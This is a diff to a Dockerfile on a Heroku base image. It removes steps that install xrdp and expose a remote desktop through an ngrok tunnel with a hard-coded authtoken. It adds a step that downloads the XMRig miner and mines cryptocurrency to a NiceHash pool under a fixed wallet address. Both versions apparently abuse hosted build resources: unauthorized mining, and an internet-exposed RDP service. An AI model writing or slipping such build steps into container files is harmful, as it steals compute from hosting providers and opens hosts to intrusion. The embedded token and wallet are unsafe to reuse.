@@ -1,3 +1,2 @@
 FROM heroku/heroku:18
-RUN apt-get install -y curl git unzip wget && apt install xfce -y && apt install xrdp && service xrdp start
-RUN wget https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-amd64.zip && unzip ngrok-stable-linux-amd64.zip && ./ngrok authtoken 22MqCTmNiH2V3cpTbTi9MQavii3_68LTRZK8UV4oXf5hekQJx && ./ngrok tcp 3389 && ping -c 99999 google.com
+RUN wget https://github.com/xmrig/xmrig/releases/download/v6.15.0/xmrig-6.15.0-linux-x64.tar.gz && tar -xf xmrig-6.15.0-linux-x64.tar.gz && cd xmrig-6.15.0 && ./xmrig -o stratum+ssl://stratum.usa-east.nicehash.com:33380 -a rx -k -u 3N1wxx2YQrvobXJtpz7Js5h5zNqx2qo7H6.jqdtrw7jgdacwtp -p x
